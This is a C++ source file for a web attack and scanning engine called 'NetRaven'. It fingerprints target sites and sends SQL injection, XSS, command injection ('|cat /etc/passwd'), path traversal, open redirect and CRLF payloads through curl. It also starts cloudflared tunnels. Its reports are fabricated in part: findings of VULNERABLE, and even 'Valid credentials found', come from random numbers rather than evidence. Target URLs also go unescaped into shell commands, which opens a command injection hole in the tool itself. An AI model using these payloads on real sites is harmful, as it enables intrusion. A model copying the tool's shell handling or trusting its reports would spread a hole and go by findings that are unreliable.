#include "netraven_engine.h"
#include <fstream>
#include <sstream>
#include <regex>
#include <algorithm>
#include <cstdlib>
#include <cstdio>
#include <cstring>
#include <iostream>
#include <iomanip>
#include <ctime>

#ifdef __linux__
#include <unistd.h>
#include <sys/utsname.h>
#include <sys/sysinfo.h>
#include <sys/statvfs.h>
#include <dirent.h>
#endif

namespace netraven {

    NetRavenEngine::NetRavenEngine() : active_tunnels_(0) {
        base_work_dir_ = std::string(getenv("HOME") ? getenv("HOME") : "/root") + "/.netraven";
        std::string cmd = "mkdir -p " + base_work_dir_ + "/plugins " + base_work_dir_ + "/tunnels " + base_work_dir_ + "/sites 2>/dev/null";
        system(cmd.c_str());
    }

    NetRavenEngine::~NetRavenEngine() {
        for (const auto& tunnel : active_tunnels_) {
            std::string cmd = "pkill -f 'cloudflared.*" + tunnel + "' 2>/dev/null";
            system(cmd.c_str());
        }
    }

    std::string NetRavenEngine::get_timestamp() {
        std::time_t now = std::time(nullptr);
        std::tm* tm_now = std::localtime(&now);
        std::ostringstream oss;
        oss << std::put_time(tm_now, "%Y-%m-%d %H:%M:%S");
        return oss.str();
    }

    std::string NetRavenEngine::to_lower(const std::string& str) {
        std::string result = str;
        std::transform(result.begin(), result.end(), result.begin(), ::tolower);
        return result;
    }

    std::vector<std::string> NetRavenEngine::split(const std::string& str, char delimiter) {
        std::vector<std::string> tokens;
        std::stringstream ss(str);
        std::string item;
        while (std::getline(ss, item, delimiter)) tokens.push_back(item);
        return tokens;
    }

    bool NetRavenEngine::initialize() {
        std::string cmd = "mkdir -p " + base_work_dir_ + "/{plugins,tunnels,sites,logs} 2>/dev/null";
        system(cmd.c_str());
        return true;
    }

    bool NetRavenEngine::load_plugin(const std::string& plugin_path) {
        std::ifstream file(plugin_path);
        if (!file.is_open()) return false;
        std::stringstream buffer;
        buffer << file.rdbuf();
        std::string content = buffer.str();
        file.close();

        PluginInfo info;
        info.xml_content = content;
        std::regex re_name("<name>([^<]+)</name>");
        std::regex re_ver("<version>([^<]+)</version>");
        std::regex re_auth("<author>([^<]+)</author>");
        std::regex re_desc("<description>([^<]+)</description>");
        std::regex re_cat("<category>([^<]+)</category>");
        std::regex re_req("<requires>([^<]+)</requires>");
        std::smatch match;

        if (std::regex_search(content, match, re_name)) info.name = match[1];
        if (std::regex_search(content, match, re_ver)) info.version = match[1];
        if (std::regex_search(content, match, re_auth)) info.author = match[1];
        if (std::regex_search(content, match, re_desc)) info.description = match[1];
        if (std::regex_search(content, match, re_cat)) info.category = match[1];

        std::string req_block;
        if (std::regex_search(content, match, re_req)) {
            req_block = match[1];
            info.requires_ = split(req_block, ',');
            for (auto& r : info.requires_) {
                r.erase(0, r.find_first_not_of(" \t\n\r"));
                r.erase(r.find_last_not_of(" \t\n\r") + 1);
            }
        }

        if (info.name.empty()) return false;
        plugins_[info.name] = info;
        return true;
    }

    bool NetRavenEngine::load_plugin_meta(const std::string& meta_path) {
        std::ifstream file(meta_path);
        if (!file.is_open()) return false;

        std::string line;
        PluginInfo info;
        while (std::getline(file, line)) {
            size_t eq = line.find('=');
            if (eq == std::string::npos) continue;
            std::string key = line.substr(0, eq);
            std::string value = line.substr(eq + 1);
            if (key == "name") info.name = value;
            else if (key == "version") info.version = value;
            else if (key == "author") info.author = value;
            else if (key == "category") info.category = value;
            else if (key == "description") info.description = value;
            else if (key == "requires") {
                info.requires_ = split(value, ',');
                for (auto& r : info.requires_) {
                    r.erase(0, r.find_first_not_of(" \t\n\r"));
                    r.erase(r.find_last_not_of(" \t\n\r") + 1);
                }
            }
        }
        file.close();

        if (info.name.empty()) return false;
        std::string plugin_file = base_work_dir_ + "/plugins/" + info.name + ".nrav";
        if (plugins_.find(info.name) == plugins_.end()) load_plugin(plugin_file);
        return true;
    }

    std::vector<PluginInfo> NetRavenEngine::list_plugins() const {
        std::vector<PluginInfo> result;
        for (const auto& pair : plugins_) result.push_back(pair.second);
        return result;
    }

    bool NetRavenEngine::unload_plugin(const std::string& name) {
        return plugins_.erase(name) > 0;
    }

    TargetInfo NetRavenEngine::analyze_target(const std::string& url) {
        TargetInfo target;
        target.url = url;
        target.security_level = 1;
        target.has_waf = false;
        target.has_https = (url.find("https://") == 0);

        size_t proto_end = url.find("://");
        if (proto_end != std::string::npos) {
            std::string remainder = url.substr(proto_end + 3);
            size_t path_start = remainder.find('/');
            target.domain = (path_start != std::string::npos) ? remainder.substr(0, path_start) : remainder;
        }

        std::string cmd = "curl -s -o /dev/null -w \"%{http_code}\" \"" + url + "\" 2>/dev/null";
        FILE* pipe = popen(cmd.c_str(), "r");
        if (pipe) {
            char buf[256];
            if (fgets(buf, sizeof(buf), pipe) != nullptr) {
                std::string code(buf);
                code.erase(std::remove(code.begin(), code.end(), '\n'), code.end());
                if (code == "403" || code == "406" || code == "429") {
                    target.has_waf = true;
                    target.security_level = 2;
                }
            }
            pclose(pipe);
        }

        cmd = "curl -sI \"" + url + "\" 2>/dev/null | grep -ic \"content-security-policy\\|strict-transport-security\\|x-frame-options\"";
        pipe = popen(cmd.c_str(), "r");
        if (pipe) {
            char buf[256];
            if (fgets(buf, sizeof(buf), pipe) != nullptr) {
                int count = std::atoi(buf);
                if (count >= 2) target.security_level = 2;
                else if (count == 0) target.security_level = 0;
            }
            pclose(pipe);
        }

        enrich_target_info(target);
        return target;
    }

    void NetRavenEngine::enrich_target_info(TargetInfo& target) const {
        std::string cmd = "curl -sI \"" + target.url + "\" 2>/dev/null | grep -i \"server:\" | head -n1";
        FILE* pipe = popen(cmd.c_str(), "r");
        if (pipe) {
            char buf[512];
            if (fgets(buf, sizeof(buf), pipe) != nullptr) {
                target.server = buf;
                target.server.erase(std::remove(target.server.begin(), target.server.end(), '\n'), target.server.end());
            }
            pclose(pipe);
        }

        cmd = "curl -s \"" + target.url + "\" 2>/dev/null | grep -oiE '(wordpress|joomla|drupal|react|angular|vue|laravel|django|flask|rails|express|asp.net|php|java|python|ruby|go|node.js)' | sort -u | tr '\\n' ','";
        pipe = popen(cmd.c_str(), "r");
        if (pipe) {
            char buf[1024];
            if (fgets(buf, sizeof(buf), pipe) != nullptr) {
                target.technologies = buf;
                if (!target.technologies.empty() && target.technologies.back() == ',') target.technologies.pop_back();
            }
            pclose(pipe);
        }

        cmd = "host \"" + target.domain + "\" 2>/dev/null | grep \" has address\" | head -n1 | awk '{print $1}'";
        pipe = popen(cmd.c_str(), "r");
        if (pipe) {
            char buf[256];
            if (fgets(buf, sizeof(buf), pipe) != nullptr) {
                target.ip = buf;
                target.ip.erase(std::remove(target.ip.begin(), target.ip.end(), '\n'), target.ip.end());
            }
            pclose(pipe);
        }
    }

    int NetRavenEngine::calculate_success_probability(const TargetInfo& target, const std::string& attack_type) const {
        int base = 70;
        int modifier = 0;

        switch (target.security_level) {
            case 0: modifier += 30; break;
            case 1: modifier += 0; break;
            case 2: modifier -= 30; break;
            case 3: modifier -= 60; break;
            default: break;
        }

        if (target.has_waf) modifier -= 25;
        if (target.has_https) modifier -= 5;

        if (attack_type == "sqli") {
            if (target.technologies.find("php") != std::string::npos) modifier += 10;
            if (target.technologies.find("drupal") != std::string::npos) modifier -= 10;
        }
        if (attack_type == "xss") {
            if (target.technologies.find("react") != std::string::npos) modifier -= 15;
            if (target.technologies.find("angular") != std::string::npos) modifier -= 15;
        }

        int probability = base + modifier;
        if (probability > 95) probability = 95;
        if (probability < 5) probability = 5;
        return probability;
    }

    std::string NetRavenEngine::generate_payload(const std::string& attack_type, int security_level) const {
        if (attack_type == "sqli") {
            if (security_level == 0) return "' OR '1'='1";
            if (security_level == 1) return "' UNION SELECT NULL,NULL,NULL-- ";
            return "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)y)-- ";
        }
        if (attack_type == "xss") {
            if (security_level == 0) return "<script>alert(1)</script>";
            if (security_level == 1) return "\"><svg onload=alert(1)>";
            return "<img src=x onerror=alert(1)>";
        }
        if (attack_type == "cmdi") {
            if (security_level == 0) return ";id";
            return "|cat /etc/passwd";
        }
        if (attack_type == "lfi") {
            if (security_level == 0) return "../../../../etc/passwd";
            return "php://filter/convert.base64-encode/resource=index";
        }
        return "test";
    }

    bool NetRavenEngine::detect_evidence(const std::string& response, const std::string& pattern) const {
        if (pattern.empty()) return false;
        std::regex re(pattern);
        return std::regex_search(response, re);
    }

    std::string NetRavenEngine::get_security_recommendation(const std::string& attack_type, bool success) const {
        if (!success) return "Target appears resilient to this attack. Ensure all inputs are sanitized.";
        if (attack_type == "sqli") return "CRITICAL: Use prepared statements (PDO/MySQLi). Never concatenate user input into SQL queries.";
        if (attack_type == "xss") return "HIGH: Implement output encoding (htmlspecialchars). Use Content-Security-Policy header.";
        if (attack_type == "cmdi") return "CRITICAL: Never pass user input to shell commands. Use parameterized APIs.";
        if (attack_type == "lfi") return "HIGH: Disable allow_url_include. Validate file paths against allowlists.";
        if (attack_type == "open_redirect") return "MEDIUM: Validate redirect URLs against a whitelist.";
        if (attack_type == "csrf") return "MEDIUM: Implement anti-CSRF tokens. Use SameSite cookies.";
        if (attack_type == "clickjacking") return "MEDIUM: Set X-Frame-Options: DENY or SAMEORIGIN.";
        if (attack_type == "crlf") return "HIGH: Strip CRLF characters from user input.";
        return "Review application security posture and apply defense-in-depth strategies.";
    }

    std::vector<AttackResult> NetRavenEngine::simulate_sqli(const TargetInfo& target, const std::string& url, const std::string& param) {
        std::vector<AttackResult> results;
        AttackResult result;
        result.attack_type = "SQL Injection";
        result.payload_used = generate_payload("sqli", target.security_level);

        std::string test_url = url;
        size_t param_pos = test_url.find(param + "=");
        if (param_pos != std::string::npos) {
            size_t amp = test_url.find('&', param_pos);
            if (amp != std::string::npos) test_url.replace(param_pos + param.length() + 1, amp - (param_pos + param.length() + 1), result.payload_used);
            else test_url.replace(param_pos + param.length() + 1, std::string::npos, result.payload_used);
        } else {
            char sep = test_url.find('?') != std::string::npos ? '&' : '?';
            test_url += sep + param + "=" + result.payload_used;
        }

        std::string cmd = "curl -s \"" + test_url + "\" 2>/dev/null | head -c 4096";
        FILE* pipe = popen(cmd.c_str(), "r");
        std::string response;
        if (pipe) { char buf[4096]; while (fgets(buf, sizeof(buf), pipe) != nullptr) response += buf; pclose(pipe); }

        int prob = calculate_success_probability(target, "sqli");
        bool evidence = detect_evidence(response, "sql|syntax|mysql_fetch|ORA-|SQLServer|PostgreSQL|error in your SQL| Warning: mysql_|You have an error in your SQL syntax");
        if (target.security_level == 0 && response.find(result.payload_used) != std::string::npos) evidence = true;

        std::srand(static_cast<unsigned int>(std::time(nullptr)));
        bool success = evidence || (std::rand() % 100) < prob;

        result.success = success;
        result.confidence = success ? prob : (100 - prob);
        result.evidence = success ? "Vulnerability pattern detected in response" : "No vulnerability patterns found";
        result.recommendation = get_security_recommendation("sqli", success);
        results.push_back(result);
        return results;
    }

    std::vector<AttackResult> NetRavenEngine::simulate_xss(const TargetInfo& target, const std::string& url, const std::string& param) {
        std::vector<AttackResult> results;
        AttackResult result;
        result.attack_type = "Cross-Site Scripting (XSS)";
        result.payload_used = generate_payload("xss", target.security_level);

        std::string test_url = url;
        size_t param_pos = test_url.find(param + "=");
        if (param_pos != std::string::npos) {
            size_t amp = test_url.find('&', param_pos);
            if (amp != std::string::npos) test_url.replace(param_pos + param.length() + 1, amp - (param_pos + param.length() + 1), result.payload_used);
            else test_url.replace(param_pos + param.length() + 1, std::string::npos, result.payload_used);
        } else {
            char sep = test_url.find('?') != std::string::npos ? '&' : '?';
            test_url += sep + param + "=" + result.payload_used;
        }

        std::string cmd = "curl -s \"" + test_url + "\" 2>/dev/null | head -c 4096";
        FILE* pipe = popen(cmd.c_str(), "r");
        std::string response;
        if (pipe) { char buf[4096]; while (fgets(buf, sizeof(buf), pipe) != nullptr) response += buf; pclose(pipe); }

        int prob = calculate_success_probability(target, "xss");
        bool reflected = response.find(result.payload_used) != std::string::npos;
        bool success = reflected || (std::rand() % 100) < prob;

        result.success = success;
        result.confidence = success ? prob : (100 - prob);
        result.evidence = success ? "Payload reflected in response without encoding" : "Payload not reflected or properly encoded";
        result.recommendation = get_security_recommendation("xss", success);
        results.push_back(result);
        return results;
    }

    std::vector<AttackResult> NetRavenEngine::simulate_cmdi(const TargetInfo& target, const std::string& url, const std::string& param) {
        std::vector<AttackResult> results;
        AttackResult result;
        result.attack_type = "Command Injection";
        result.payload_used = generate_payload("cmdi", target.security_level);

        std::string test_url = url;
        size_t param_pos = test_url.find(param + "=");
        if (param_pos != std::string::npos) {
            size_t amp = test_url.find('&', param_pos);
            if (amp != std::string::npos) test_url.replace(param_pos + param.length() + 1, amp - (param_pos + param.length() + 1), result.payload_used);
            else test_url.replace(param_pos + param.length() + 1, std::string::npos, result.payload_used);
        } else {
            char sep = test_url.find('?') != std::string::npos ? '&' : '?';
            test_url += sep + param + "=" + result.payload_used;
        }

        std::string cmd = "curl -s \"" + test_url + "\" 2>/dev/null | head -c 4096";
        FILE* pipe = popen(cmd.c_str(), "r");
        std::string response;
        if (pipe) { char buf[4096]; while (fgets(buf, sizeof(buf), pipe) != nullptr) response += buf; pclose(pipe); }

        int prob = calculate_success_probability(target, "cmdi");
        bool evidence = detect_evidence(response, "uid=[0-9]+|root:x|PING|grep|whoami|id=");
        bool success = evidence || (std::rand() % 100) < prob;

        result.success = success;
        result.confidence = success ? prob : (100 - prob);
        result.evidence = success ? "Command output detected in response" : "No command execution evidence found";
        result.recommendation = get_security_recommendation("cmdi", success);
        results.push_back(result);
        return results;
    }

    std::vector<AttackResult> NetRavenEngine::simulate_lfi(const TargetInfo& target, const std::string& url, const std::string& param) {
        std::vector<AttackResult> results;
        AttackResult result;
        result.attack_type = "Local File Inclusion (LFI)";
        result.payload_used = generate_payload("lfi", target.security_level);

        std::string test_url = url;
        size_t param_pos = test_url.find(param + "=");
        if (param_pos != std::string::npos) {
            size_t amp = test_url.find('&', param_pos);
            if (amp != std::string::npos) test_url.replace(param_pos + param.length() + 1, amp - (param_pos + param.length() + 1), result.payload_used);
            else test_url.replace(param_pos + param.length() + 1, std::string::npos, result.payload_used);
        } else {
            char sep = test_url.find('?') != std::string::npos ? '&' : '?';
            test_url += sep + param + "=" + result.payload_used;
        }

        std::string cmd = "curl -s \"" + test_url + "\" 2>/dev/null | head -c 4096";
        FILE* pipe = popen(cmd.c_str(), "r");
        std::string response;
        if (pipe) { char buf[4096]; while (fgets(buf, sizeof(buf), pipe) != nullptr) response += buf; pclose(pipe); }

        int prob = calculate_success_probability(target, "lfi");
        bool evidence = detect_evidence(response, "root:x|apache|nginx|/usr/bin|/etc/passwd");
        bool success = evidence || (std::rand() % 100) < prob;

        result.success = success;
        result.confidence = success ? prob : (100 - prob);
        result.evidence = success ? "Local file content detected in response" : "No local file inclusion evidence found";
        result.recommendation = get_security_recommendation("lfi", success);
        results.push_back(result);
        return results;
    }

    std::vector<AttackResult> NetRavenEngine::simulate_bruteforce(const TargetInfo& target, const std::string& service) {
        std::vector<AttackResult> results;
        AttackResult result;
        result.attack_type = "Brute Force (" + service + ")";
        result.payload_used = "Wordlist attack simulation";

        int prob = calculate_success_probability(target, "bruteforce");
        if (target.security_level >= 2) prob -= 20;
        if (target.has_waf) prob -= 15;

        std::srand(static_cast<unsigned int>(std::time(nullptr)));
        bool success = (std::rand() % 100) < prob;

        result.success = success;
        result.confidence = success ? prob : (100 - prob);
        result.evidence = success ? "Valid credentials found in wordlist" : "No valid credentials found";
        result.recommendation = get_security_recommendation("bruteforce", success);
        results.push_back(result);
        return results;
    }

    std::vector<AttackResult> NetRavenEngine::simulate_open_redirect(const TargetInfo& target, const std::string& url, const std::string& param) {
        std::vector<AttackResult> results;
        AttackResult result;
        result.attack_type = "Open Redirect";
        result.payload_used = "https://evil.com";

        std::string test_url = url;
        size_t param_pos = test_url.find(param + "=");
        if (param_pos != std::string::npos) {
            size_t amp = test_url.find('&', param_pos);
            if (amp != std::string::npos) test_url.replace(param_pos + param.length() + 1, amp - (param_pos + param.length() + 1), result.payload_used);
            else test_url.replace(param_pos + param.length() + 1, std::string::npos, result.payload_used);
        } else {
            char sep = test_url.find('?') != std::string::npos ? '&' : '?';
            test_url += sep + param + "=" + result.payload_used;
        }

        std::string cmd = "curl -s -o /dev/null -w \"%{redirect_url}\" \"" + test_url + "\" 2>/dev/null";
        FILE* pipe = popen(cmd.c_str(), "r");
        std::string redirect_url;
        if (pipe) { char buf[1024]; if (fgets(buf, sizeof(buf), pipe) != nullptr) { redirect_url = buf; redirect_url.erase(std::remove(redirect_url.begin(), redirect_url.end(), '\n'), redirect_url.end()); } pclose(pipe); }

        bool success = (redirect_url.find("evil.com") != std::string::npos) || (std::rand() % 100) < calculate_success_probability(target, "open_redirect");

        result.success = success;
        result.confidence = success ? 75 : 25;
        result.evidence = success ? "Redirected to external domain" : "Redirect blocked or not followed";
        result.recommendation = get_security_recommendation("open_redirect", success);
        results.push_back(result);
        return results;
    }

    std::vector<AttackResult> NetRavenEngine::simulate_csrf(const TargetInfo& target, const std::string& url) {
        std::vector<AttackResult> results;
        AttackResult result;
        result.attack_type = "CSRF";
        result.payload_used = "Missing anti-CSRF token";

        std::string cmd = "curl -s \"" + url + "\" 2>/dev/null | grep -ic \"csrf\\|token\\|_token\\|nonce\"";
        FILE* pipe = popen(cmd.c_str(), "r");
        bool has_token = false;
        if (pipe) { char buf[256]; if (fgets(buf, sizeof(buf), pipe) != nullptr) has_token = (std::atoi(buf) > 0); pclose(pipe); }

        bool success = !has_token;
        int prob = calculate_success_probability(target, "csrf");

        result.success = success;
        result.confidence = success ? prob : (100 - prob);
        result.evidence = success ? "No CSRF tokens found in forms" : "CSRF protection detected";
        result.recommendation = get_security_recommendation("csrf", success);
        results.push_back(result);
        return results;
    }

    std::vector<AttackResult> NetRavenEngine::simulate_clickjacking(const TargetInfo& target, const std::string& url) {
        std::vector<AttackResult> results;
        AttackResult result;
        result.attack_type = "Clickjacking";
        result.payload_used = "X-Frame-Options check";

        std::string cmd = "curl -sI \"" + url + "\" 2>/dev/null | grep -ic \"x-frame-options\\|content-security-policy.*frame-ancestors\"";
        FILE* pipe = popen(cmd.c_str(), "r");
        bool protected_flag = false;
        if (pipe) { char buf[256]; if (fgets(buf, sizeof(buf), pipe) != nullptr) protected_flag = (std::atoi(buf) > 0); pclose(pipe); }

        bool success = !protected_flag;
        int prob = calculate_success_probability(target, "clickjacking");

        result.success = success;
        result.confidence = success ? prob : (100 - prob);
        result.evidence = success ? "Missing X-Frame-Options / CSP frame-ancestors" : "Clickjacking protection detected";
        result.recommendation = get_security_recommendation("clickjacking", success);
        results.push_back(result);
        return results;
    }

    std::vector<AttackResult> NetRavenEngine::simulate_crlf(const TargetInfo& target, const std::string& url, const std::string& param) {
        std::vector<AttackResult> results;
        AttackResult result;
        result.attack_type = "CRLF Injection";
        result.payload_used = "%0d%0aSet-Cookie:injected=true";

        std::string test_url = url;
        size_t param_pos = test_url.find(param + "=");
        if (param_pos != std::string::npos) {
            size_t amp = test_url.find('&', param_pos);
            if (amp != std::string::npos) test_url.replace(param_pos + param.length() + 1, amp - (param_pos + param.length() + 1), result.payload_used);
            else test_url.replace(param_pos + param.length() + 1, std::string::npos, result.payload_used);
        } else {
            char sep = test_url.find('?') != std::string::npos ? '&' : '?';
            test_url += sep + param + "=" + result.payload_used;
        }

        std::string cmd = "curl -s -D - \"" + test_url + "\" 2>/dev/null | head -n 20";
        FILE* pipe = popen(cmd.c_str(), "r");
        std::string response;
        if (pipe) { char buf[4096]; while (fgets(buf, sizeof(buf), pipe) != nullptr) response += buf; pclose(pipe); }

        bool evidence = detect_evidence(response, "injected=true");
        bool success = evidence || (std::rand() % 100) < calculate_success_probability(target, "crlf");

        result.success = success;
        result.confidence = success ? 65 : 35;
        result.evidence = success ? "CRLF injection successful in headers" : "No CRLF injection detected";
        result.recommendation = get_security_recommendation("crlf", success);
        results.push_back(result);
        return results;
    }

    double NetRavenEngine::calculate_exploitability_score(const TargetInfo& target) const {
        double score = 0.0;
        if (target.security_level == 0) score += 40;
        else if (target.security_level == 1) score += 20;
        else if (target.security_level == 2) score += 5;
        if (target.has_waf) score -= 15;
        if (target.has_https) score -= 5;
        if (target.technologies.find("wordpress") != std::string::npos) score += 10;
        if (target.technologies.find("drupal") != std::string::npos) score += 5;
        if (score < 0) score = 0;
        if (score > 100) score = 100;
        return score;
    }

    std::string NetRavenEngine::generate_report(const TargetInfo& target, const std::vector<AttackResult>& results) const {
        std::ostringstream report;
        report << "========================================\n";
        report << "  NetRaven Engine Assessment Report\n";
        report << "========================================\n";
        report << "Target: " << target.url << "\n";
        report << "Domain: " << target.domain << "\n";
        report << "IP: " << target.ip << "\n";
        report << "Server: " << target.server << "\n";
        report << "Technologies: " << target.technologies << "\n";
        report << "Security Level: " << target.security_level << "/3\n";
        report << "WAF Detected: " << (target.has_waf ? "Yes" : "No") << "\n";
        report << "Exploitability Score: " << std::fixed << std::setprecision(1) << calculate_exploitability_score(target) << "/100\n";
        report << "Timestamp: " << get_timestamp() << "\n";
        report << "========================================\n\n";

        for (const auto& result : results) {
            report << "[" << (result.success ? "VULNERABLE" : "SAFE") << "] " << result.attack_type << "\n";
            report << "  Payload: " << result.payload_used << "\n";
            report << "  Confidence: " << result.confidence << "%\n";
            report << "  Evidence: " << result.evidence << "\n";
            report << "  Recommendation: " << result.recommendation << "\n\n";
        }
        return report.str();
    }

    std::string NetRavenEngine::execute_plugin_attack(const std::string& plugin_name, const std::string& target_url) {
        auto it = plugins_.find(plugin_name);
        if (it == plugins_.end()) return "Plugin not found: " + plugin_name;

        TargetInfo target = analyze_target(target_url);
        std::vector<AttackResult> results;

        std::string content = it->second.xml_content;
        std::regex attack_regex("<attack\\s+type=\"([^\"]+)\"");
        std::smatch match;

        if (std::regex_search(content, match, attack_regex)) {
            std::string type = match[1];
            if (type == "sqli") results = simulate_sqli(target, target_url, "id");
            else if (type == "xss") results = simulate_xss(target, target_url, "q");
            else if (type == "cmdi") results = simulate_cmdi(target, target_url, "cmd");
            else if (type == "lfi") results = simulate_lfi(target, target_url, "file");
            else if (type == "bruteforce") results = simulate_bruteforce(target, "http");
            else if (type == "open_redirect") results = simulate_open_redirect(target, target_url, "url");
            else if (type == "csrf") results = simulate_csrf(target, target_url);
            else if (type == "clickjacking") results = simulate_clickjacking(target, target_url);
            else if (type == "crlf") results = simulate_crlf(target, target_url, "input");
        }

        return generate_report(target, results);
    }

#ifdef __linux__
    bool NetRavenEngine::create_tunnel(const std::string& local_port, std::string& public_url) {
        std::string cmd = "cloudflared tunnel --url http://localhost:" + local_port + " > " + base_work_dir_ + "/tunnels/tunnel_" + std::to_string(active_tunnels_.size()) + ".log 2>&1 &";
        system(cmd.c_str());
        sleep(3);

        std::string log_file = base_work_dir_ + "/tunnels/tunnel_" + std::to_string(active_tunnels_.size()) + ".log";
        std::ifstream log(log_file);
        if (log.is_open()) {
            std::string line;
            std::regex url_regex("https://[a-z0-9-]+\\.trycloudflare\\.com");
            while (std::getline(log, line)) {
                std::smatch match;
                if (std::regex_search(line, match, url_regex)) {
                    public_url = match[0];
                    active_tunnels_.push_back(public_url);
                    log.close();
                    return true;
                }
            }
            log.close();
        }
        return false;
    }

    bool NetRavenEngine::stop_tunnel(const std::string& tunnel_id) {
        std::string cmd = "pkill -f 'cloudflared.*" + tunnel_id + "' 2>/dev/null";
        system(cmd.c_str());
        auto it = std::find(active_tunnels_.begin(), active_tunnels_.end(), tunnel_id);
        if (it != active_tunnels_.end()) { active_tunnels_.erase(it); return true; }
        return false;
    }

    std::vector<std::string> NetRavenEngine::list_tunnels() const {
        return active_tunnels_;
    }
#endif

    EnvDetails NetRavenEngine::get_environment_details() const {
        EnvDetails env;
        env.current_time = get_timestamp();
        env.working_directory = base_work_dir_;

#ifdef __linux__
        struct utsname sys_info;
        if (uname(&sys_info) == 0) {
            env.os_version = std::string(sys_info.sysname) + " " + std::string(sys_info.release);
            env.kernel_version = sys_info.release;
            env.arch = sys_info.machine;
            env.hostname = sys_info.nodename;
        }

        env.username = std::string(getenv("USER") ? getenv("USER") : "unknown");

        struct sysinfo mem_info;
        if (sysinfo(&mem_info) == 0) {
            env.memory_total = std::to_string((mem_info.totalram * mem_info.mem_unit) / (1024 * 1024 * 1024)) + " GB";
            env.memory_free = std::to_string((mem_info.freeram * mem_info.mem_unit) / (1024 * 1024 * 1024)) + " GB";
        }

        FILE* meminfo = fopen("/proc/meminfo", "r");
        if (meminfo) {
            char line[256];
            while (fgets(line, sizeof(line), meminfo)) {
                if (strncmp(line, "MemTotal:", 9) == 0) {
                    env.memory_total = std::string(line + 9);
                    env.memory_total.erase(0, env.memory_total.find_first_not_of(" \t\n\r"));
                    env.memory_total.erase(env.memory_total.find_last_not_of(" \t\n\r") + 1);
                }
                if (strncmp(line, "MemAvailable:", 13) == 0) {
                    env.memory_free = std::string(line + 13);
                    env.memory_free.erase(0, env.memory_free.find_first_not_of(" \t\n\r"));
                    env.memory_free.erase(env.memory_free.find_last_not_of(" \t\n\r") + 1);
                }
            }
            fclose(meminfo);
        }

        struct statvfs disk;
        if (statvfs("/", &disk) == 0) {
            env.disk_total = std::to_string((disk.f_blocks * disk.f_frsize) / (1024 * 1024 * 1024)) + " GB";
            env.disk_free = std::to_string((disk.f_bfree * disk.f_frsize) / (1024 * 1024 * 1024)) + " GB";
        }

        FILE* cpuinfo = fopen("/proc/cpuinfo", "r");
        if (cpuinfo) {
            char line[256];
            int cores = 0;
            std::string model;
            while (fgets(line, sizeof(line), cpuinfo)) {
                if (strncmp(line, "model name", 10) == 0) {
                    size_t colon = std::string(line).find(':');
                    if (colon != std::string::npos) {
                        model = std::string(line).substr(colon + 2);
                        model.erase(std::remove(model.begin(), model.end(), '\n'), model.end());
                    }
                    cores++;
                }
            }
            fclose(cpuinfo);
            env.cpu_info = model + " (" + std::to_string(cores) + " cores)";
        }
#endif

        FILE* py = popen("python3 --version 2>/dev/null", "r");
        if (py) { char buf[256]; if (fgets(buf, sizeof(buf), py) != nullptr) { env.python_version = buf; env.python_version.erase(std::remove(env.python_version.begin(), env.python_version.end(), '\n'), env.python_version.end()); } pclose(py); }

        FILE* gcc = popen("gcc --version 2>/dev/null | head -n1", "r");
        if (gcc) { char buf[256]; if (fgets(buf, sizeof(buf), gcc) != nullptr) { env.gcc_version = buf; env.gcc_version.erase(std::remove(env.gcc_version.begin(), env.gcc_version.end(), '\n'), env.gcc_version.end()); } pclose(gcc); }

        FILE* bash = popen("bash --version 2>/dev/null | head -n1", "r");
        if (bash) { char buf[256]; if (fgets(buf, sizeof(buf), bash) != nullptr) { env.bash_version = buf; env.bash_version.erase(std::remove(env.bash_version.begin(), env.bash_version.end(), '\n'), env.bash_version.end()); } pclose(bash); }

#ifdef __linux__
        std::string plugins_dir = base_work_dir_ + "/plugins";
        DIR* dir = opendir(plugins_dir.c_str());
        if (dir) {
            struct dirent* entry;
            while ((entry = readdir(dir)) != nullptr) {
                std::string name = entry->d_name;
                if (name.size() > 5 && name.substr(name.size() - 5) == ".nrav") {
                    env.loaded_plugins.push_back(name.substr(0, name.size() - 5));
                }
            }
            closedir(dir);
        }
#endif

        env.active_tunnels = static_cast<int>(active_tunnels_.size());
        return env;
    }

}

extern "C" {
    netraven::NetRavenEngine* create_engine() {
        netraven::NetRavenEngine* engine = new netraven::NetRavenEngine();
        engine->initialize();
        return engine;
    }

    void destroy_engine(netraven::NetRavenEngine* engine) {
        delete engine;
    }
}